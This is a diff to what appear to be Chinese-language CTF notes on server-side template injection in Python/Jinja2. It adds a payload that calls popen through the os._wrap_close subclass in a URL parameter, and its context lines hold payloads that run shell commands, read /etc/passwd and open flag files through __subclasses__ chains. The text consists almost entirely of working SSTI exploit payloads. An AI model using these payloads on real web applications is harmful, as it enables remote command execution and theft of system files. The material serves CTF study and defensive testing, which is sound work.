@@ -213,7 +213,12 @@ popen("cd ..;cd ..;cd ..;ls;cat flag.txt").read()
 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
 ```
 
-4、其他常用类利用：
+4、os._wrap_close类利用
+```
+?name={{%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()}}
+```
+
+5、其他常用类利用：
 ```
 <type 'file'>
 [].__class__.__base__.__subclasses__()[40]('fl4g').read()
